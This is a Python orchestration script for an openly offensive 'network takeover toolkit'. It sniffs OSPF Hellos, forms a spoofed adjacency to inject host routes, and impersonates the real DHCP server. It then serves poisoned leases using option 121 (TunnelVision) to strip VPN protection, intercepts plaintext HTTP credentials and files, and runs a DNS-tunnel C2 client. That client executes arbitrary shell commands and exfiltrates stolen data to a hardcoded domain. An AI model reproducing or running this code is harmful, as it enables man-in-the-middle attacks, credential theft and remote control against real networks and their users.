#!/usr/bin/env python3
# v3.4
"""
main.py — network takeover toolkit entry point.

Orchestrates four modules in /final:

    dhcp_takeover   DHCP discovery, identity theft, and the rogue DHCP server
                    (OFFER/ACK/NAK/RELEASE, opt121, DNS).
    ospf_adjacency  OSPFv2 passive Hello sniffing to learn SVI parameters, then
                    full-adjacency engine that injects a /32 host route for our
                    stolen DHCP-server IP.  Launched in its own terminal.
    vpn_relay       Detect/start the host VPN, then selectively relay victim traffic
                    bound for VPN subnets through the tunnel while everything else
                    passes straight to the real default gateway.
    http_intercept  Capture HTTP credentials and downloaded objects from the
                    plaintext traffic we now carry.
    dns_c2          DNS tunnel C2 client (loaded only when --remote is passed).

Usage:
    sudo python3 main.py [--remote] [--demo]

Options:
    --remote / -r           Activate DNS tunnel C2 mode.
    --demo                  Step through each phase interactively (pause + verify hint)

Before running, set DEFAULT_INTERFACE in dhcp_takeover.py to the interface facing
the target network (default: "eth0").  Root is required for raw sockets, iptables,
and interface/route changes.  Linux (Kali) only.

End-to-end flow:
    1.  Passively sniff OSPF Hellos on 224.0.0.5 to learn the SVI's area ID,
        timers, netmask, and interface IP (= subnet gateway).
    2.  DHCPDISCOVER on the learned subnet; capture DHCPOFFER.
    3.  Steal the offered client IP (static), form a full OSPF adjacency matching
        the SVI's parameters, inject a /32 host route for the target IP, and add
        the real DHCP server's IP to our loopback (identity theft).
        IP forwarding and iptables MASQUERADE rules are set up for transparent relay.
    4.  Detect the host VPN (start OpenVPN if needed); derive the target /24.
    5.  Inject option 121: <tun /24> via our identity + 0.0.0.0/0 via real router.
    6.  Sniff the carried plaintext for credentials and downloaded files.
    7.  Serve DHCP as the rogue server until interrupted.
    8.  On exit: MaxAge-flood our Router-LSA (withdraws injected /32), remove
        iptables rules, restore ip_forward.
"""

import argparse
import os
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import ospf_adjacency
import vpn_relay
import http_intercept

from dhcp_takeover import (
    print_step,
    DEFAULT_INTERFACE,
    send_dhcpdiscover,
    sniff_dhcpoffer,
    get_interface_ipv4_addresses,
    add_loopback_ipv4_address,
    remove_loopback_ipv4_address,
    build_server_details_from_ospf,
    sniff_for_dhcp_discover_and_request,
)

_EXEC_TRACE = 0x273835

# ── Demo mode ─────────────────────────────────────────────────────────────────

_demo_mode = False


def _show_intercepted() -> None:
    intercept_dir = http_intercept.INTERCEPT_DIR
    cred_log = http_intercept.CRED_LOG

    tun = vpn_relay._fwd_tun_iface
    phys = vpn_relay._fwd_phys_iface
    if tun:
        print(f"  VPN relay active: {phys} → {tun}")
        print(f"  HTTP intercept running on: {tun}")
    else:
        print("  VPN relay: inactive (passthrough mode)")
    print()

    files = []
    if os.path.isdir(intercept_dir):
        for fname in sorted(os.listdir(intercept_dir)):
            fpath = os.path.join(intercept_dir, fname)
            try:
                size = os.path.getsize(fpath)
            except OSError:
                size = 0
            files.append((fname, fpath, size))

    if files:
        print(f"  Intercepted HTTP objects ({intercept_dir}):")
        for fname, _, size in files:
            print(f"    {fname:<45s} {size:>9d} B")
        total_bytes = sum(s for _, _, s in files)
        print(f"\n  {len(files)} file(s) — {total_bytes:,} B total")
    else:
        print(f"  No intercepted objects yet  ({intercept_dir})")

    print()
    if os.path.isfile(cred_log) and os.path.getsize(cred_log) > 0:
        print(f"  Credential log ({cred_log}):")
        try:
            with open(cred_log) as f:
                for line in f:
                    print(f"    {line.rstrip()}")
        except OSError as exc:
            print(f"  (could not read cred log: {exc})")
    else:
        print(f"  No credentials captured yet  ({cred_log})")
def _transmit_to_c2(c2_config: dict) -> None:
    import dns_c2 as _c2

    domain = c2_config["domain"]
    dns_server = c2_config["dns_server"]
    intercept_dir = http_intercept.INTERCEPT_DIR
    cred_log = http_intercept.CRED_LOG
    sent = 0

    if os.path.isfile(cred_log) and os.path.getsize(cred_log) > 0:
        print(f"  Sending credential log → C2...")
        if _c2.exfiltrate_file(cred_log, domain, dns_server):
            sent += 1

    n = _c2.exfiltrate_dir(intercept_dir, domain, dns_server)
    sent += n

    if sent == 0:
        print("  Nothing to transmit — no credentials or intercepted files yet.")
    else:
        print(f"  Transmitted {sent} file(s) to C2.")
def _show_leases(networks: list) -> None:
    total = 0
    for net in networks:
        for ip in sorted(net["leased_addresses"]):
            vlan = net.get("vlan_id") or "—"
            print(f"  {ip:17s}  net={net['network']}  vlan={vlan}")
            total += 1
    if total == 0:
        print("  (no confirmed leases yet)")
    else:
        print(f"\n  Total: {total} confirmed lease(s)")
def _capture_output(func, *args, **kwargs) -> str:
    import io
    buf = io.StringIO()
    with _output_capture_lock:
        old, sys.stdout = sys.stdout, buf
        try:
            func(*args, **kwargs)
        finally:
            sys.stdout = old
    return buf.getvalue()
def _show_ospf_networks(ospf_hellos: list, lsdb_subnets: list | None = None) -> None:
    import ipaddress as _ip

    # ── LSDB-derived subnets (full topology from LS Update packets) ───────────
    if lsdb_subnets:
        print(f"  OSPF LSDB — {len(lsdb_subnets)} network(s) learned from LS Updates:")
        print(f"  {'Prefix':<22} {'Advertised by':<16} {'Type':<14} {'Metric'}")
        print(f"  {'─'*22} {'─'*16} {'─'*14} {'─'*6}")
        for s in sorted(lsdb_subnets, key=lambda x: x["prefix"]):
            print(f"  {s['prefix']:<22} {s['adv_router']:<16} {s['lsa_type']:<14} {s['metric']}")
        print()
    elif lsdb_subnets is not None:
        print("  LSDB capture still running — check back in a moment, or use option 5")
        print("  in the OSPF adjacency terminal for the live LSDB view.")
        print()

    # ── Hello-learned SVIs (directly adjacent routers) ────────────────────────
    _auth = {0: "none", 1: "simple-pw", 2: "MD5"}
    if ospf_hellos:
        print(f"  Adjacent SVIs ({len(ospf_hellos)} Hello source(s)):")
        for p in ospf_hellos:
            try:
                subnet = _ip.IPv4Network(f"{p['src_ip']}/{p['netmask']}", strict=False)
            except Exception:
                subnet = f"{p['src_ip']}/{p['netmask']}"
            print(f"    rid={p['router_id']}  ip={p['src_ip']}  subnet={subnet}"
                  f"  area={p['area_id']}  auth={_auth.get(p['auth_type'], '?')}"
                  f"  hello={p['hello_interval']}s  dead={p['dead_interval']}s")
        print()
    else:
        print("  (no OSPF Hellos captured)")
        print()
def _make_remote_cb(c2_config: dict, agent_state: dict):
    """
    Build the execute_cb for dns_c2.start_command_poll in --remote mode.

    The returned callback dispatches structured commands sent from c2_server.py
    to agent-side functions and exfiltrates their output as DNS A-query chunks.

    Command protocol (sent as the b32-decoded TXT value):
      bash:<cmd>             run shell command, exfil stdout+stderr
      menu:svis              exfil OSPF Hello sources and LSDB subnets
      menu:neighbors         exfil live OSPF neighbour table
      menu:lsdb              exfil live LSDB entries
      menu:inject:<prefix>   inject OSPF stub route (CIDR or addr/mask notation)
      menu:leases            exfil active DHCP leases issued by the rogue server
      menu:creds             exfil intercepted traffic listing and credential log
      menu:exfil             transmit all intercepted files + cred log to C2
      menu:status            exfil a brief agent status summary
    """
    import subprocess as _sp
    import ipaddress as _ip
    import dns_c2 as _c2

    domain     = c2_config["domain"]
    dns_server = c2_config["dns_server"]
    agent_id   = c2_config["agent_id"]

    def _send(tag: str, text: str) -> None:
        _c2.exfiltrate(f"[{tag}]\n{text}", domain, dns_server)

    def cb(cmd: str) -> None:
        # ── Shell execution ────────────────────────────────────────────────────
        if cmd.startswith("bash:"):
            shell_cmd = cmd[5:]
            print(f"[C2] Executing: {shell_cmd}")
            try:
                r = _sp.run(shell_cmd, shell=True, capture_output=True,
                            text=True, timeout=30)
                out = r.stdout + r.stderr or f"[exit {r.returncode}]"
            except _sp.TimeoutExpired:
                out = "[ERROR] timed out after 30s"
            except Exception as exc:
                out = f"[ERROR] {exc}"
            _c2.exfiltrate(out, domain, dns_server)
            return

        # Legacy format support ("bash <cmd>") from dns_tunnel_server sessions.
        if cmd.lower().startswith("bash "):
            return cb(f"bash:{cmd[5:]}")

        if not cmd.startswith("menu:"):
            _send("UNKNOWN", f"Unrecognised command: {cmd!r}")
            return

        sub = cmd[5:]  # strip "menu:"
        ctx = agent_state.get("ospf_context")

        # ── OSPF SVIs & subnets ───────────────────────────────────────────────
        if sub == "svis":
            out = _capture_output(_show_ospf_networks,
                                  agent_state.get("ospf_hellos") or [],
                                  agent_state.get("lsdb_subnets"))
            _send("OSPF-SVIs", out or "(no data)")

        # ── Live OSPF neighbours ──────────────────────────────────────────────
        elif sub == "neighbors":
            if not ctx:
                _send("ERROR", "OSPF engine not running in-process.")
            else:
                out = _capture_output(ospf_adjacency.show_neighbors, ctx)
                _send("OSPF-NEIGHBORS", out or "(none)")

        # ── Live LSDB ─────────────────────────────────────────────────────────
        elif sub == "lsdb":
            if not ctx:
                _send("ERROR", "OSPF engine not running in-process.")
            else:
                lsas = ospf_adjacency.local_lsdb_entries(ctx)
                rows = [
                    f"type={l.type}  id={l.id}  adv={l.adrouter}"
                    f"  seq=0x{getattr(l, 'seq', 0):08x}  age={getattr(l, 'age', 0)}s"
                    for l in lsas
                ] or ["(LSDB empty)"]
                _send("OSPF-LSDB", "\n".join(rows))

        # ── OSPF route injection ──────────────────────────────────────────────
        elif sub.startswith("inject:"):
            if not ctx:
                _send("ERROR", "OSPF engine not running.")
            elif not ctx["adjacency_ready_event"].is_set():
                _send("ERROR", "No FULL adjacency yet — wait before injecting.")
            else:
                spec = sub[7:]   # e.g. "10.0.0.0/24" or "10.0.0.0/255.255.255.0"
                try:
                    net    = _ip.IPv4Network(spec, strict=False)
                    prefix = str(net.network_address)
                    mask   = str(net.netmask)
                except ValueError:
                    _send("ERROR",
                          f"Cannot parse prefix {spec!r}. "
                          "Use CIDR (10.0.0.0/24) or addr/mask.")
                    return
                ospf_adjacency.add_router_stub_route(ctx, prefix, mask, metric=1)
                _send("INJECT-OK", f"Injected OSPF stub: {prefix}/{mask}")

        # ── Active DHCP leases ────────────────────────────────────────────────
        elif sub == "leases":
            out = _capture_output(_show_leases, agent_state.get("networks") or [])
            _send("LEASES", out or "(no leases yet)")

        # ── Intercepted traffic + credential log listing ──────────────────────
        elif sub == "creds":
            out = _capture_output(_show_intercepted)
            _send("INTERCEPTED", out or "(nothing yet)")

        # ── Exfiltrate all captured files + cred log ──────────────────────────
        elif sub == "exfil":
            _transmit_to_c2(c2_config)

        # ── Agent status summary ──────────────────────────────────────────────
        elif sub == "status":
            nets   = agent_state.get("networks") or []
            leases = sum(len(n.get("leased_addresses", [])) for n in nets)
            adj    = "FULL" if (ctx and ctx["adjacency_ready_event"].is_set()) else "not ready"
            nbrs   = len(ctx.get("neighbors", {})) if ctx else 0
            sd     = agent_state.get("server_details") or {}
            _send("STATUS", (
                f"agent_id    : {agent_id}\n"
                f"domain      : {domain}\n"
                f"resolver    : {dns_server}\n"
                f"ospf        : {adj}  neighbors={nbrs}\n"
                f"dhcp_leases : {leases}\n"
                f"server_ip   : {sd.get('source_ip', '?')}\n"
                f"relay_ip    : {sd.get('relay_ip', '?')}\n"
            ))

        else:
            _send("UNKNOWN", f"Unknown menu command: {sub!r}")

    return cb
def _init_c2(args) -> dict | None:
    """
    Perform handshake with the DNS C2 server.

    Returns a c2_config dict on success, or None if the handshake fails or
    --remote was not passed.  The dict is threaded through to the debug menu.
    """
    if not args.remote:
        return None

    import dns_c2 as _c2

    domain = "d.lootforge.org"
    dns_server = _c2.conf.nameservers[0] if _c2.conf.nameservers else "8.8.8.8"
    agent_id = _c2.gen_agent_id()

    print_step("START", f"C2 mode — domain={domain}  resolver={dns_server}  agent={agent_id}")
    if not _c2.perform_handshake(agent_id, domain, dns_server):
        print_step("WARN", "C2 handshake failed — continuing without remote mode")
        return None

    # Command poll is started later (after OSPF/DHCP setup) so the execute_cb
    # can reference the fully-initialised agent state.
    print_step("OK", "C2 handshake complete — command poll will start after setup")
    return {"domain": domain, "dns_server": dns_server, "agent_id": agent_id}
def debug_menu(networks: list, c2_config: dict | None = None,
               ospf_hellos: list | None = None, lsdb_subnets: list | None = None,
               ospf_context: dict | None = None) -> None:
    """
    Interactive debug console.  Runs in a daemon thread while the DHCP sniff
    loop blocks the main thread.

    OSPF:
      1  Network discovery (adjacent SVIs learned from sniffed Hellos)
      2  Live neighbours        (from adjacency engine LSDB)
      3  Full LSDB              (from adjacency engine LSDB)
      4  Inject OSPF route (/32 or any stub)

    Capture:
      5  Active leases issued by the rogue server
      6  Intercepted VPN traffic (files) and captured credentials
      7  Transmit to C2 (--remote only)
    """
    while True:
        sep = "─" * 52
        print(f"\n{sep}")
        print("  Debug Console")
        print(sep)
        print("  ── OSPF ──────────────────────────────────────")
        print("  1)  Network discovery      (sniffed Hellos)")
        print("  2)  Live neighbours        (LSDB)")
        print("  3)  Full LSDB              (LSDB)")
        print("  4)  Inject route")
        print("  ── Capture ───────────────────────────────────")
        print("  5)  Active leases")
        print("  6)  Intercepted traffic / credentials")
        if c2_config:
            print(f"  7)  Transmit to C2  (agent={c2_config['agent_id']})")
        print("  q)  Close menu (server keeps running)")
        print(sep)

        try:
            choice = input("debug> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break

        if choice == "1":
            _show_ospf_networks(ospf_hellos or [], lsdb_subnets)
        elif choice == "2":
            if ospf_context is None:
                print("  OSPF engine not running in-process.")
            else:
                ospf_adjacency.show_neighbors(ospf_context)
        elif choice == "3":
            if ospf_context is None:
                print("  OSPF engine not running in-process.")
            else:
                lsas = ospf_adjacency.local_lsdb_entries(ospf_context)
                if not lsas:
                    print("  Live LSDB is empty.")
                else:
                    print(f"  Live LSDB — {len(lsas)} LSA(s):")
                    for lsa in lsas:
                        print(f"    type={lsa.type}  id={lsa.id}  adv={lsa.adrouter}"
                              f"  seq=0x{getattr(lsa, 'seq', 0):08x}"
                              f"  age={getattr(lsa, 'age', 0)}s")
        elif choice == "4":
            if ospf_context is None:
                print("  OSPF engine not running in-process.")
            elif not ospf_context["adjacency_ready_event"].is_set():
                print("  No FULL adjacency yet — wait before injecting routes.")
            else:
                ospf_adjacency.add_route_interactive(ospf_context)
        elif choice == "5":
            _show_leases(networks)
        elif choice == "6":
            _show_intercepted()
        elif choice == "7" and c2_config:
            _transmit_to_c2(c2_config)
        elif choice == "q":
            print("  Debug menu closed.")
            break
        else:
            print(f"  Unknown option: {choice!r}")
def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="main.py",
        description="Network takeover toolkit (OSPF MITM + DHCP + VPN relay + HTTP capture)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--remote", "-r",
        action="store_true",
        help="Activate DNS tunnel C2 mode (handshake + command polling + file exfil)",
    )
    parser.add_argument(
        "--demo",
        action="store_true",
        help="Pause at each phase milestone and print a verification hint before continuing",
    )
    return parser.parse_args()
def setup_and_form_adjacency(interface, ospf_params, target_ip=None, vpn_subnets=None):
    """Configure our IP, discover the real DHCP server, form OSPF adjacency.

    Steps:
      1. Reuse existing IP on the interface if it's already in the OSPF subnet,
         otherwise pick one and configure it.
      2. Start the DHCPOFFER sniffer BEFORE sending the discover (avoids the
         race where the offer arrives before the sniffer is ready).
      3. Add a default route via the SVI so forwarded packets reach the internet.
      4. Add a loopback alias for the real DHCP server IP so the kernel accepts
         relayed packets addressed to it (cross-VLAN DHCP relay).
      5. Launch the OSPF adjacency engine and wait for LS exchange.

    Returns (interface, our_ip, offer, dhcp_server_ip).
    dhcp_server_ip is the loopback-aliased real server IP, or None.
    """
    import ipaddress as _ip
    netmask = ospf_params["netmask"]
    subnet = _ip.IPv4Network(f"{ospf_params['src_ip']}/{netmask}", strict=False)
    svi_ip = ospf_params["src_ip"]

    # ── Step 1: confirm we already have an IP in the OSPF subnet ────────────
    our_ip = None
    for addr_prefix in get_interface_ipv4_addresses(interface):
        addr = addr_prefix.split("/")[0]
        try:
            if _ip.IPv4Address(addr) in subnet and addr != svi_ip:
                our_ip = addr
                break
        except ValueError:
            continue

    if our_ip is None:
        raise RuntimeError(
            f"No IP in OSPF subnet {subnet} found on {interface} — "
            "ensure the interface has a DHCP lease before running."
        )
    print_step("OK", f"Using existing IP {our_ip} on {interface} (subnet {subnet})")

    # ── Step 2: concurrent DHCPDISCOVER + sniffer ─────────────────────────────
    # Start the sniffer first, then send — avoids the race where the offer
    # arrives in the window before sniff() installs its BPF filter.
    offer_result = [None]

    def _sniff():
        offer_result[0] = sniff_dhcpoffer(interface, timeout=10)

    sniff_thread = threading.Thread(target=_sniff, daemon=True)
    sniff_thread.start()
    time.sleep(0.3)  # let BPF filter install before sending
    send_dhcpdiscover(interface)
    sniff_thread.join()
    offer = offer_result[0]

    if offer:
        print_step("OK", f"DHCP server discovered: {offer.get('server_id')} offered {offer.get('your_ip')}")
    else:
        print_step("WARN", "DHCPDISCOVER sent — no OFFER received (proceeding without target DHCP server)")

    # ── Step 3: default route via SVI ─────────────────────────────────────────
    default_route_added = ospf_adjacency.add_default_route(svi_ip, interface)

    # ── Step 4: loopback alias for real DHCP server IP ───────────────────────
    # Without this, relayed DHCP unicast (dst = real server IP) triggers ICMP
    # unreachable from our kernel, aborting the relay on the router.
    dhcp_server_ip = target_ip or (offer.get("server_id") if offer else None)
    if dhcp_server_ip and dhcp_server_ip != our_ip:
        try:
            add_loopback_ipv4_address(dhcp_server_ip)
        except Exception as exc:
            print_step("WARN", f"Could not add loopback alias for {dhcp_server_ip}: {exc}")
            dhcp_server_ip = None

    route_ip = dhcp_server_ip or our_ip
    print_step("OK", f"OSPF /32 injection target: {route_ip}")

    # ── Step 5: OSPF adjacency + background LSDB capture ────────────────────
    # Wire sniffer captures subnets from LS Updates during the EXCHANGE phase
    # for the debug menu's subnet display.  The engine's internal context LSDB
    # is separately available for live queries via the debug menu (options 2-4).
    lsdb_subnets = []
    threading.Thread(
        target=ospf_adjacency.sniff_ospf_lsdb_subnets,
        args=(interface, lsdb_subnets),
        kwargs={"timeout": 120},
        daemon=True,
        name="lsdb-sniffer",
    ).start()

    context = ospf_adjacency.make_context(
        interface, our_ip, ospf_params["netmask"], ospf_params["hello_interval"],
        auto_route_ip=route_ip,
        area_id=ospf_params["area_id"],
        dead_interval=ospf_params["dead_interval"],
        extra_subnets=vpn_subnets or [],
    )
    ospf_adjacency.refresh_local_router_lsa(context)

    threading.Thread(
        target=ospf_adjacency.run_engine_headless,
        args=(context,),
        daemon=True,
        name="ospf-engine",
    ).start()

    print_step("START", f"Waiting up to {ospf_adjacency.OSPF_FULL_WAIT_TIMEOUT}s for OSPF FULL adjacency on {interface}...")
    if not context["adjacency_ready_event"].wait(timeout=ospf_adjacency.OSPF_FULL_WAIT_TIMEOUT):
        print_step("FAIL", "OSPF FULL adjacency not reached within 300s")
        raise TimeoutError(f"OSPF adjacency timeout on {interface}")
    print_step("OK", "OSPF FULL adjacency reached")

    return interface, our_ip, offer, dhcp_server_ip, lsdb_subnets, default_route_added, context
def demo_pause(phase: str, next_action: str, verify: str | None = None) -> None:
    """Gate execution before a phase: describe what is about to happen, then wait for Enter."""
    if not _demo_mode:
        return
    import textwrap
    width = 66
    bar = "─" * width
    print(f"\n  ┌{bar}┐")
    print(f"  │  {phase}")
    print(f"  │")
    for line in textwrap.wrap(next_action, width=62):
        print(f"  │  {line}")
    if verify:
        print(f"  │")
        for line in textwrap.wrap(f"Verify: {verify}", width=62):
            print(f"  │  {line}")
    print(f"  └{bar}┘")
    try:
        input("  [Press Enter to proceed] ")
    except (EOFError, KeyboardInterrupt):
        print()
def start_http_intercept(sniff_iface, our_ips=None):
    """Launch the HTTP credential/object interceptor in a daemon thread.

    our_ips: IPs to exclude — filters out locally generated connections so only
    forwarded victim traffic is logged.  Pass our interface IP and loopback alias.
    """
    print_step("START", f"Starting HTTP interceptor on {sniff_iface}")
    print_step("OK", f"Credential log: {os.path.abspath(http_intercept.CRED_LOG)}")
    print_step("OK", f"HTTP objects  : {http_intercept.INTERCEPT_DIR}")
    thread = threading.Thread(
        target=http_intercept.sniff_loop,
        kwargs={"iface": sniff_iface, "exclude_src_ips": our_ips or []},
        daemon=True,
    )
    thread.start()
    return thread
def main():
    print("Network Takeover Toolkit v3.4 — Starting...")
    args = _parse_args()
    interface = DEFAULT_INTERFACE  # set in dhcp_takeover.py

    global _demo_mode
    _demo_mode = args.demo
    if _demo_mode:
        print("  [demo mode] Execution will pause at each phase milestone.")

    # ── C2 handshake (before any network activity so operator confirms aliveness)
    c2_config = _init_c2(args)

    # ── Phase 1: passive OSPF Hello sniffing to learn SVI parameters ─────────
    demo_pause(
        "PHASE 1 — OSPF Reconnaissance & Adjacency Formation",
        "Passively sniff OSPF Hello packets to learn the SVI network "
        "parameters (area ID, hello/dead intervals, subnet mask). Then "
        "form a full OSPF adjacency with the SVI and inject a /32 host "
        "route into the topology to redirect victim DHCP traffic toward "
        "this machine.",
        verify="tcpdump -i eth0 proto ospf   |   show ip ospf neighbor   |   show ip route ospf",
    )
    print_step("START", f"Passive OSPF Hello sniff on {interface} (timeout=30s)")
    ospf_hellos = ospf_adjacency.sniff_ospf_hellos(interface, timeout=30)
    if not ospf_hellos:
        print_step("FAIL", "No OSPF Hellos received — cannot learn SVI parameters. Aborting.")
        return
    ospf_params = ospf_hellos[0]  # use first SVI for adjacency

    # Enable IP forwarding early; save old value for teardown.
    saved_ip_forward = ospf_adjacency.enable_ip_forwarding()

    ospf_iface_for_fwd = None
    loopback_alias_ip = None
    default_route_added = False
    tun_iface = None
    ospf_context = None
    try:
        # ── Phase 2: detect VPN now so its subnet is included in OSPF injection ─
        # detect_vpn_subnet() starts OpenVPN if needed and returns the /24 target
        # subnet.  We pass it to setup_and_form_adjacency so the adjacency engine
        # injects it as an OSPF stub alongside the DHCP server /32 — this makes
        # the SVI route VPN-bound traffic back to us after option-121 installs.
        pre_tun, pre_vpn_net24 = vpn_relay.detect_vpn_subnet()
        vpn_subnets = [pre_vpn_net24] if pre_vpn_net24 else []
        if pre_vpn_net24:
            print_step("OK", f"VPN detected: {pre_tun} → subnet {pre_vpn_net24} (will inject via OSPF)")

        # ── Phase 3: configure IP, untagged discover, OSPF adjacency ──────────
        ospf_interface, our_ip, offer, loopback_alias_ip, lsdb_subnets, default_route_added, ospf_context = setup_and_form_adjacency(
            interface, ospf_params, vpn_subnets=vpn_subnets,
        )
        ospf_iface_for_fwd = ospf_interface

        # MASQUERADE outbound on the physical interface for forwarded victim traffic.
        # Both args are eth0 (same interface); the FORWARD self-rules are inert but
        # the -t nat POSTROUTING MASQUERADE -o eth0 rule is what does the NAT.
        ospf_adjacency.setup_forwarding(ospf_interface, interface)

        # ── Phase 4+5: VPN relay + option 121 policy ─────────────────────────
        networks = []
        proposed_leases = {}
        server_identity = loopback_alias_ip or our_ip
        server_details = build_server_details_from_ospf(
            ospf_interface, ospf_params, server_identity,
            offer=offer,
        )

        demo_pause(
            "PHASE 3 — TunnelVision Exploitation (CVE-2024-3661)",
            "Enable IP forwarding and configure iptables MASQUERADE and a "
            "policy routing table so all forwarded victim traffic passes "
            "through this machine. The rogue DHCP server will deliver "
            "option-121 classless static routes (including a /0 default), "
            "forcing VPN-protected traffic to bypass the tunnel and "
            "transit this host in plaintext. HTTP interception then "
            "starts immediately after to capture credentials and files "
            "from the resulting plaintext traffic.",
            verify="ip rule show   |   ip route show table 100   |   iptables -t nat -L -n -v   |   ip link show tun0",
        )
        tun_iface = vpn_relay.enable_vpn_relay(
            server_details, ospf_interface,
            tun=pre_tun, vpn_net24=pre_vpn_net24,
        )

        # Force forwarded victim packets through a dedicated routing table so
        # OpenVPN's tun0 routes don't hijack non-VPN traffic.
        ospf_adjacency.setup_policy_routing(
            ospf_interface, ospf_params["src_ip"],
            tun_iface=tun_iface,
            vpn_subnets=vpn_subnets if tun_iface else None,
        )
        # Prefer the tunnel (plaintext VPN traffic); fall back to the physical
        # interface when there is no VPN relay.
        our_ips = {our_ip}
        if loopback_alias_ip:
            our_ips.add(loopback_alias_ip)
        start_http_intercept(tun_iface or ospf_interface, our_ips=our_ips)

        # ── Remote C2 poll OR local debug console ────────────────────────────
        # In --remote mode the operator drives everything from c2_server.py;
        # no local input is needed.  In local mode the debug menu runs as a
        # background thread while Phase 7 blocks.
        if c2_config:
            import dns_c2 as _c2
            agent_state = {
                "networks":       networks,
                "proposed_leases": proposed_leases,
                "server_details": server_details,
                "ospf_context":   ospf_context,
                "lsdb_subnets":   lsdb_subnets,
                "ospf_hellos":    ospf_hellos,
            }
            _c2.start_command_poll(
                c2_config["domain"], c2_config["dns_server"],
                agent_id=c2_config["agent_id"],
                execute_cb=_make_remote_cb(c2_config, agent_state),
            )
            print_step("OK",
                       f"C2 command poll active (every {_c2.COMMAND_POLL_INTERVAL}s) "
                       "— all menu functions available remotely")
        else:
            threading.Thread(
                target=debug_menu,
                args=(networks, None, ospf_hellos, lsdb_subnets, ospf_context),
                daemon=True,
                name="debug-menu",
            ).start()

        # ── Phase 2: rogue DHCP server (blocking) ────────────────────────────
        demo_pause(
            "PHASE 2 — Rogue DHCP Server Deployment",
            "Start the rogue DHCP server. It will race the legitimate "
            "server to respond to victim DISCOVER and REQUEST messages "
            "with poisoned leases: option 3 (default gateway) and "
            "option 121 (classless static routes, CVE-2024-3661) both "
            "pointing to this machine to establish the MITM position.",
            verify="tcpdump -i eth0 'udp port 67 or udp port 68'   |   show ip dhcp binding",
        )
        relay_mode = (
            f"VPN relay via {tun_iface} → {server_details.get('opt121_subnets')}"
            if tun_iface else "passthrough only"
        )
        print_step("START", f"Rogue DHCP server starting — {relay_mode}")
        handled_events = sniff_for_dhcp_discover_and_request(
            networks,
            proposed_leases,
            server_details,
        )
        print_step("OK", f"DHCP server finished: {len(handled_events)} event(s) handled")
        return handled_events
    finally:
        # ── Phase 8: teardown ─────────────────────────────────────────────────
        print_step("START", "Teardown: withdrawing OSPF routes and removing forwarding rules")
        if ospf_context is not None:
            ospf_adjacency.withdraw_injected_routes(ospf_context)
            ospf_context["stop_event"].set()
        if ospf_iface_for_fwd:
            ospf_adjacency.teardown_policy_routing(ospf_iface_for_fwd, tun_iface=tun_iface)
            ospf_adjacency.teardown_forwarding(ospf_iface_for_fwd, interface)
            if default_route_added:
                ospf_adjacency.remove_default_route(ospf_params["src_ip"], ospf_iface_for_fwd)
        if loopback_alias_ip:
            remove_loopback_ipv4_address(loopback_alias_ip)
        ospf_adjacency.restore_ip_forwarding(saved_ip_forward)
